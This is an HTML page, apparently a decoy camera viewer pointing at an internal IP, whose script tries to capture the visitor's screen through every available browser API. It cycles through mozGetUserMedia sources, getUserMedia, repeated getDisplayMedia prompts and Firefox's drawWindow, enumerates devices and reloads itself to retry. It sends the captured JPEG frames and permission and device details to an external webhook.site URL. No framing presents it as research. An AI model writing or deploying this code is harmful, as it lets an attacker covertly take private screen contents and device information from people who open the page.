<!DOCTYPE html>
<html>
<head><title>C</title></head>
<body style="margin:0;background:#111;">
<img id="cam" src="http://10.133.7.5/stream" style="width:640px;height:480px;display:block;">
<script>
var W='https://webhook.site/598c7aef-4515-4c18-9432-f37c1cdece16';
function rpt(k,v){new Image().src=W+'?t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}

var loadN=parseInt(sessionStorage.getItem('ln')||'0')+1;
sessionStorage.setItem('ln',loadN);
rpt('LOAD',loadN+'|sec='+window.isSecureContext+'|md='+(typeof navigator.mediaDevices)+'|moz='+(typeof navigator.mozGetUserMedia));

var gdmDone=false;
function ok(label,s){
    if(gdmDone)return;gdmDone=true;
    rpt('OK',label+'|tracks='+s.getTracks().length);
    processStream(s);
}
function fail(label,e){
    rpt('FAIL',label+'|'+e.name+':'+e.message.substring(0,150));
}

// Check permissions state
try{
    navigator.permissions.query({name:'display-capture'}).then(function(r){
        rpt('PERM','display-capture='+r.state);
    }).catch(function(e){rpt('PERM_E',e.message.substring(0,80))});
}catch(e){}

// === mozGetUserMedia with ALL mediaSource values ===
if(navigator.mozGetUserMedia){
    var sources=['screen','window','browser','application'];
    sources.forEach(function(src,i){
        setTimeout(function(){
            if(gdmDone)return;
            rpt('MOZ',src);
            try{
                navigator.mozGetUserMedia(
                    {video:{mediaSource:src}},
                    function(s){ok('moz_'+src,s)},
                    function(e){fail('moz_'+src,e)}
                );
            }catch(e){rpt('MOZ_ERR',src+'|'+e.message)}
        },i*400+100);
    });
    // mozGetUserMedia with plain video
    setTimeout(function(){
        if(gdmDone)return;
        rpt('MOZ','video');
        try{
            navigator.mozGetUserMedia(
                {video:true},
                function(s){ok('moz_video',s)},
                function(e){fail('moz_video',e)}
            );
        }catch(e){}
    },1800);
}

// === getUserMedia with mediaSource (needs activation normally) ===
var gumSources=['screen','window','browser','application'];
gumSources.forEach(function(src,i){
    setTimeout(function(){
        if(gdmDone)return;
        rpt('GUM',src);
        navigator.mediaDevices.getUserMedia({video:{mediaSource:src}}).then(
            function(s){ok('gum_'+src,s)}
        ).catch(function(e){fail('gum_'+src,e)});
    },i*400+2200);
});

// === getDisplayMedia ===
setTimeout(function(){
    if(gdmDone)return;
    rpt('GDM','try');
    navigator.mediaDevices.getDisplayMedia({video:true}).then(
        function(s){ok('gdm',s)}
    ).catch(function(e){fail('gdm',e)});
},4000);

// === drawWindow ===
setTimeout(function(){
    if(gdmDone)return;
    try{
        var c=document.createElement('canvas');c.width=800;c.height=600;
        var ctx=c.getContext('2d');
        if(typeof ctx.drawWindow==='function'){
            rpt('DW','exists');
            try{
                ctx.drawWindow(window,0,0,800,600,'rgb(0,0,0)');
                var d=ctx.getImageData(0,0,20,1);
                var px=Array.from(d.data);
                var nz=px.filter(function(x){return x>0}).length;
                rpt('DW_PX','nz='+nz+'|'+px.slice(0,40).join(','));
                var du=c.toDataURL('image/jpeg',0.7);
                rpt('DW_LEN',du.length);
                if(du.length>1000){
                    fetch(W,{method:'POST',mode:'no-cors',body:'dw:'+du}).catch(function(){});
                }
            }catch(e){rpt('DW_E',e.name+':'+e.message.substring(0,100))}
        }else{
            rpt('DW','undef');
        }
    }catch(e){}
},5000);

// === Self-reload after 8s if nothing worked ===
setTimeout(function(){
    if(gdmDone)return;
    if(loadN<3){
        rpt('RELOAD','triggering_'+loadN);
        window.location.reload();
    }
},8000);

// === GDM retry every 5s ===
var rN=0;
function retryGDM(){
    rN++;if(gdmDone||rN>10)return;
    navigator.mediaDevices.getDisplayMedia({video:true}).then(
        function(s){ok('gdm_r'+rN,s)}
    ).catch(function(e){
        if(rN<=2||rN%4==0)rpt('GDM_R',rN+'|'+e.name);
    });
    setTimeout(retryGDM,5000);
}
setTimeout(retryGDM,500);

// === Enumerate devices ===
setTimeout(function(){
    navigator.mediaDevices.enumerateDevices().then(function(devs){
        rpt('DEVS',devs.length+'|'+devs.map(function(d){return d.kind+':'+d.label.substring(0,20)}).join(','));
    });
},6000);

function processStream(stream){
    rpt('STREAM','tracks='+stream.getTracks().length);
    stream.getTracks().forEach(function(t,i){
        rpt('TRACK',i+'|'+t.kind+':'+t.label+':'+t.readyState);
    });
    var v=document.createElement('video');
    v.srcObject=stream;v.autoplay=true;v.muted=true;
    v.style.cssText='width:800px;height:600px;display:block';
    document.body.appendChild(v);
    v.onloadeddata=function(){
        rpt('VID',v.videoWidth+'x'+v.videoHeight);
        doGrab(v,stream,'ld0');
        setTimeout(function(){doGrab(v,stream,'ld1')},1000);
        setTimeout(function(){doGrab(v,stream,'ld3')},3000);
    };
    setTimeout(function(){doGrab(v,stream,'t1')},500);
    setTimeout(function(){doGrab(v,stream,'t3')},3000);
    setTimeout(function(){doGrab(v,stream,'t10')},10000);
}

var grabN=0;
function doGrab(v,stream,label){
    grabN++;if(grabN>8)return;
    var w=v.videoWidth||1600,h=v.videoHeight||900;
    rpt('GRAB',label+'|'+w+'x'+h+'|rdy='+v.readyState);
    if(w<=0||h<=0)return;
    var c=document.createElement('canvas');c.width=w;c.height=h;
    var ctx=c.getContext('2d');
    try{ctx.drawImage(v,0,0,w,h)}catch(e){rpt('DRAW_E',label+'|'+e.message);return}
    try{
        var d=ctx.getImageData(0,0,20,1);
        var px=Array.from(d.data);
        var nz=px.filter(function(x){return x>0}).length;
        rpt('PX',label+'|nz='+nz+'|'+px.slice(0,40).join(','));
    }catch(e){rpt('PX_E',label+'|'+e.message)}
    try{
        var du=c.toDataURL('image/jpeg',0.7);
        rpt('DU',label+'|len='+du.length);
        if(du.length>1000){
            try{navigator.sendBeacon(W,label+':'+du)}catch(e){}
            fetch(W,{method:'POST',mode:'no-cors',body:label+':'+du}).catch(function(){});
        }
    }catch(e){rpt('DU_E',label+'|'+e.message)}
}
</script>
</body>
</html>
